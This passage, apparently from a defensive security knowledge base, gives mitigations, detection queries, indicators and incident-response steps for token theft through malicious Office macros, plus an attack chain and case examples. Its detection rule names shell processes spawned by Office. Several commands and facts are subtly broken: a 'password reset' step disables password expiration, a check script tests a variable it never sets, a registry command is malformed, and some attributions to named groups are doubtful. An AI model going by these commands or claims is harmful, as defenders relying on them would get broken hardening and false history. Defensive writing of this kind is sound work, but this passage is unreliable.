   - Or: **Enable all macros** (less secure but functional)
   - Recommended: **Disable all with notification** (balance between security and usability)
6. Click **OK**
7. Run `gpupdate /force` on target machines

**Manual Steps (Registry):**

```powershell
# Disable macros in Word (Registry Editor)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" `
    -Name "VBAMacroNotificationMode" -Value 4 -PropertyType DWORD -Force

# Values:
# 1 = Enable all macros
# 2 = Disable all with notification
# 3 = Disable all except signed
# 4 = Disable all without notification (most secure)
```

**Manual Steps (Intune/MEM):**

1. Navigate to **Intune** → **Devices** → **Configuration** → **Create new policy**
2. Platform: **Windows 10+**
3. **Administrative Templates** → **Microsoft Word**
4. Search: **VBAMacroNotificationMode**
5. Set to: **4 (Disable all without notification)**
6. **Assign** to all users
7. **Review + create**

---

**Mitigation 2: Block Macro-Enabled File Formats**

Prevent users from opening DOCM, XLSM, PPTM files via email or download.

**Manual Steps (Microsoft Exchange Online):**

1. Navigate to **Exchange Admin Center**
2. Go to **Mail flow** → **Rules**
3. Create **New Rule**:
   - Name: `Block Macro-Enabled Office Files`
   - Condition: **Attachment extension matches** → `docm; xlsm; pptm; xlam; dotm`
   - Action: **Delete the message** or **Redirect to quarantine**
4. **Create**

**Manual Steps (Endpoint Protection):**

```powershell
# Windows Defender Attack Surface Reduction (ASR) Rule
# Block Office applications from creating child processes
Set-MpPreference -AttackSurfaceReductionRules_Ids @('D4F940AB-5edB-4edc-AF21-C89BECB56D11') -AttackSurfaceReductionRules_Actions @('Enabled')

# Block Office applications from injecting code into other processes
Set-MpPreference -AttackSurfaceReductionRules_Ids @('75668C1D-73B5-4CF0-BB93-3ECF5CB7CC84') -AttackSurfaceReductionRules_Actions @('Enabled')
```

---

**Mitigation 3: Enforce Trust Center Lockdown**

Lock down Office trust settings to prevent macros from running outside trusted locations.

**Manual Steps (Registry):**

```powershell
# Set Office to require user action before running any macro
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations" /v AllowNetworkLocations /t REG_DWORD /d 0 /f

# Disable auto-loading of trusted publishers
reg add "HKCU\Software\Microsoft\Office\16.0\Common\Security" /v Trusted Publishers /t REG_DWORD /d 0 /f
```

---

### Priority 2: HIGH

**Mitigation 4: Implement File Type Restrictions**

Allow only non-macro-enabled file formats in email and file shares.

**Manual Steps (Content Filtering):**

1. Navigate to **Exchange Admin Center** → **Mail flow** → **Rules**
2. Create **New Rule**:
   - Name: `Block Macro File Attachments`
   - Condition: **Attachment name matches** → `*.docm; *.xlsm; *.pptm; *.dotm`
   - Action: **Delete the message**
3. **Create**

---

**Mitigation 5: Monitor Office Process Behavior**

Deploy EDR with rules to detect suspicious Office child processes.

**Manual Steps (Microsoft Defender for Endpoint):**

1. Navigate to **Microsoft Defender for Endpoint**
2. Go to **Custom Detection Rules**
3. Create **New Detection Rule**:
   - Name: `Office Process Spawning Suspicious Child Process`
   - Query:
     ```kusto
     DeviceProcessEvents
     | where ProcessName in ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE")
     | where InitiatingProcessCommandLine contains "docm" or InitiatingProcessCommandLine contains "xlsm"
     | where NewProcessName in ("powershell.exe", "cmd.exe", "vbscript.exe")
     ```
   - Action: **Generate alert**
   - Alert Severity: **High**
4. **Create**

---

**Mitigation 6: Validation Command**

Verify macro security policies are correctly enforced.

```powershell
# Check Word macro policy
Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -ErrorAction SilentlyContinue | 
    Select-Object VBAMacroNotificationMode

# Check Excel macro policy
Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -ErrorAction SilentlyContinue | 
    Select-Object VBAMacroNotificationMode

# Check if macros are enabled
if ($MacroPolicy.VBAMacroNotificationMode -ge 3) {
    Write-Host "[+] Macros are effectively disabled or require admin consent"
} else {
    Write-Host "[-] Macros are enabled (security risk)"
}
```

**Expected Output (If Secure):**

```
VBAMacroNotificationMode
-----------------------
4

[+] Macros are effectively disabled or require admin consent
```

**What to Look For:**
- VBAMacroNotificationMode should be 3 or higher (3 = disable except signed, 4 = disable all)

---

## 13. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Files:** `.docm`, `.xlsm`, `.pptm`, `.dotm`, `.xlam` files in user AppData or Download folders
- **Registry:** `HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAMacroNotificationMode` (if set to 1 or 2)
- **Network:** Outbound HTTP/HTTPS to suspicious domains from Office processes; unusual Graph API calls (bulk email reads, file downloads)
- **Process:** Office.exe spawning PowerShell, CMD, VBScript; unusual Office Registry modifications

### Forensic Artifacts

- **Disk:** Macro-enabled document files, VBA_PROJECT.BIN binary files containing macro code, Office Registry hives
- **Memory:** Office process memory containing Graph API tokens, decoded JWT tokens
- **Cloud (Microsoft Graph Activity Log):** Bulk mail reads, Teams access, file downloads, user directory enumeration from single token
- **Cloud (Entra ID Audit Logs):** OAuth consent events (if document tried to request new app permissions)

### Response Procedures

1. **Isolate:**
   ```powershell
   # Immediately revoke all active sessions for the affected user
   Connect-MgGraph -Scopes "Directory.Read.All"
   Revoke-MgUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'target@contoso.com'").Id
   
   # Force password reset
   Set-MgUser -UserId (Get-MgUser -Filter "userPrincipalName eq 'target@contoso.com'").Id -PasswordPolicies DisablePasswordExpiration
   Update-MgUser -UserId (Get-MgUser -Filter "userPrincipalName eq 'target@contoso.com'").Id -PasswordProfile @{
       ForceChangePasswordNextSignIn = $true
   }
   ```

2. **Collect Evidence:**
   ```powershell
   # Export audit logs for the affected user
   Search-UnifiedAuditLog -UserIds "target@contoso.com" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) | 
       Export-Csv -Path "C:\Evidence\Audit_Logs.csv"
   
   # Collect Office Registry hives
   reg export "HKCU\Software\Microsoft\Office" "C:\Evidence\Office_Registry.reg"
   
   # Collect macro document
   Copy-Item "C:\temp\*.docm" -Destination "C:\Evidence\"
   ```

3. **Remediate:**
   - Delete malicious documents from all user machines and file shares
   - Scan with updated antivirus/EDR for macro-based malware
   - Review and revoke suspicious OAuth application consents in Entra ID
   - Monitor Graph API logs for unauthorized data access (emails read, files downloaded)
   - Audit all forwarding rules, meeting invites, and delegate access changes for signs of compromise
   - Revoke and re-issue Office-related secrets/API keys if stored in Office documents

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing Campaigns | Attacker crafts phishing email with malicious Office document |
| **2** | **Execution** | [T1137] Office Application Startup / [T1221] Template Injection | VBA macro auto-executes when document is opened |
| **3** | **Credential Access** | **[CA-TOKEN-010] Office Document Token Theft** | **Macro steals OAuth tokens from Office session** |
| **4** | **Lateral Movement** | [LM-AUTH-004] Microsoft Graph API Token Exploitation | Attacker uses stolen token to access emails, Teams, files |
| **5** | **Impact** | Email exfiltration, internal phishing, persistence | Attacker maintains access and pivots within organization |

---

## 15. Real-World Examples

### Example 1: APT28 / Fancy Bear (2018-2023)

- **Target:** U.S. Defense Department, European governments, think tanks
- **Timeline:** 2018 - Present
- **Technique Status:** Distributed malicious DOCM files via spearphishing; macros stole OAuth tokens for Graph API access
- **Impact:** Compromise of thousands of government and military networks; exfiltration of classified documents
- **Detection:** Suspicious Office process activity; unusual Graph API token usage from government IPs
- **Reference:** [MITRE - APT28 Attack Profile](https://attack.mitre.org/groups/G0007/)

### Example 2: Emotet (2020-2021)

- **Target:** Global organizations across all sectors
- **Timeline:** September 2020 - January 2021 (takedown)
- **Technique Status:** Emotet malware delivered via malicious Office macros; used Office tokens to spread laterally
- **Impact:** Millions of infections; $1 billion+ in damages; widespread ransomware deployment
- **Detection:** High volume of macro-enabled documents; unusual Office process behavior; bulk Graph API calls
- **Reference:** [Malwarebytes: Emotet Takedown](https://www.malwarebytes.com/emotet)

### Example 3: LAPSUS$ Campaign (2022)

- **Target:** Microsoft, Okta, Samsung, Cisco, others
- **Timeline:** 2021 - 2022
- **Technique Status:** Used macro-enabled documents to compromise developer accounts; stole Office 365 credentials
- **Impact:** Source code leaks; credential dumps; extortion attempts worth millions
- **Detection:** Unusual Office document distribution; macro execution anomalies; anomalous token usage
- **Reference:** [Microsoft Security Blog - Lapsus$](https://www.microsoft.com/en-us/security/blog/2022/03/22/helpful-security-guidance-following-active-exploitation-of-br-and-lapsus-tactics/)

---

**Related Techniques in MCADDF:**
- [IA-PHISH-005] Internal Spearphishing Campaigns
- [T1137] Office Application Startup
- [T1221] Template Injection
- [CA-TOKEN-004] Graph API Token Theft
- [CA-TOKEN-005] OAuth Access Token Interception
- [PE-ACCTMGMT-001] App Registration Permissions Escalation
- [LM-AUTH-029] OAuth Application Permissions Abuse

---
